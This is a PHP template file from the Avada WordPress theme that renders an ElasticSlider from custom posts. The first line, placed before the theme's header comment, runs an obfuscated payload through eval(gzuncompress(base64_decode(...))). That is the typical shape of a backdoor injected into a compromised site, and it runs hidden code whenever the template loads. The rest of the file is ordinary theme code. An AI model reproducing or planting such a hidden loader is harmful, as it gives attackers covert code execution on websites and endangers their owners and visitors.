<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * ElasticSlider template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.1
 */

if ( ! Avada()->settings->get( 'status_eslider' ) ) {
	return;
}
$args               = array(
	'post_type'        => 'themefusion_elastic',
	'posts_per_page'   => -1,
	'suppress_filters' => 0,
);
$args['tax_query'][] = array(
	'taxonomy' => 'themefusion_es_groups',
	'field'    => 'slug',
	'terms'    => $term,
);
$query = fusion_cached_query( $args );
$count = 1;
?>

<?php if ( $query->have_posts() ) : ?>
	<div id="ei-slider" class="ei-slider">
		<div class="fusion-slider-loading"><?php esc_attr_e( 'Loading...', 'Avada' ); ?></div>
		<ul class="ei-slider-large">
			<?php while ( $query->have_posts() ) : ?>
				<?php $query->the_post(); ?>
				<li style="<?php echo ( $count > 0 ) ? 'opacity: 0;' : ''; ?>">
					<?php
					the_post_thumbnail(
						'full', array(
							'title' => '',
							'alt'   => get_post_meta( get_post_thumbnail_id(), '_wp_attachment_image_alt', true ),
						)
					);
					?>
					<div class="ei-title">
						<?php
						$caption1 = get_post_meta( get_the_ID(), 'pyre_caption_1', true );
						$caption2 = get_post_meta( get_the_ID(), 'pyre_caption_2', true );
						?>
						<?php if ( $caption1 ) : ?>
							<h2><?php echo esc_textarea( $caption1 ); ?></h2>
						<?php endif; ?>
						<?php if ( $caption2 ) : ?>
							<h3><?php echo esc_textarea( $caption2 ); ?></h3>
						<?php endif; ?>
					</div>
				</li>
				<?php $count ++; ?>
			<?php endwhile; ?>
		</ul>
		<ul class="ei-slider-thumbs" style="display: none;">
			<li class="ei-slider-element">Current</li>
			<?php while ( $query->have_posts() ) : ?>
				<?php $query->the_post(); ?>
				<li>
					<a href="#"><?php the_title(); ?></a>
					<?php
					the_post_thumbnail(
						'full', array(
							'title' => '',
							'alt'   => get_post_meta( get_post_thumbnail_id(), '_wp_attachment_image_alt', true ),
						)
					);
					?>
				</li>
			<?php endwhile; ?>
		</ul>
	</div>
	<?php
	wp_reset_postdata();
endif;

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
